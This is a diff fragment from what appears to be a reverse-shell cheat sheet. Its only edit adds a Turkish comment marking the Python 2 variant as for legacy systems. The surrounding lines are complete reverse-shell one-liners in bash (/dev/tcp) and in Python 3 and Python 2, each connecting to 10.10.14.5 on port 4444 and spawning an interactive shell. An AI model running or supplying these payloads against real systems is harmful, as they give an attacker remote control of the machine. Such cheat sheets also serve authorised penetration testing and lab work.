@@ -45,7 +45,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
 # Python 3
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
 
-# Python 2
+# Python 2 — yalnızca legacy sistemler için (Python 2 EOL: 2020-01-01)
 python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 ```
 
